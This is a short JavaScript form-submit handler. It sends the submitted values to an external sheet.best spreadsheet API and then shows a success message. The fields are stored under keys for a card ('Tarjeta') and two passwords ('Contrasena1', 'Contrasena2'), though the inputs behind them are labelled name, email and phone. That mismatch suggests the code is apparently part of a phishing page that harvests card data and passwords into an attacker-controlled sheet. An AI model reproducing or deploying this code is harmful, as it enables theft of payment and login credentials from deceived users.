const formulario = document.getElementById('formulario');
const registro = document.getElementById('registro');
const exito = document.getElementById('exito');

formulario.addEventListener('submit', async(e) =>{
    e.preventDefault();


try {    
    const respuesta = await fetch('https://sheet.best/api/sheets/075515b5-5ec0-4ec3-ad6a-f2953f5fef0f', {
        method: 'POST',
        mode: 'cors',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            "Tarjeta": formulario.nombre.value,
            "Contrasena1": formulario.correo.value,
            "Contrasena2": formulario.telefono.value
        })
    });



} catch(error){
    console.log(error);
}
    
    registro.classList.remove('activo');
    exito.classList.add('activo');
});
